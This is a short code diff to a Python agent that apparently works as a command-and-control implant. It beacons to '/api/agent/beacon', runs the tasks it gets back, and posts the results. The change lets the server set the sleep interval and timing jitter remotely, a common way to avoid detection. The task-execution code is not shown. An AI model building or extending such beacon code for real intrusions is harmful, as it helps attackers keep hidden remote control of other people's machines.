@@ -138,9 +138,13 @@ def execute_task(task):
 
 def beacon_loop():
     import random
+    _sleep = SLEEP
+    _jitter = 10
     while True:
         try:
             resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
+            _sleep = int(resp.get("sleep", _sleep))
+            _jitter = int(resp.get("jitter", _jitter))
             for task in resp.get("tasks", []):
                 result = execute_task(task)
                 if len(result) > 65000:
@@ -148,7 +152,8 @@ def beacon_loop():
                 http_post("/api/agent/result", {"task_id": task["id"], "result": result})
         except Exception:
             pass
-        time.sleep(SLEEP + random.uniform(-1, 1))
+        jitter_s = _sleep * _jitter / 100
+        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))
 
 register()
 threading.Thread(target=beacon_loop, daemon=True).start()
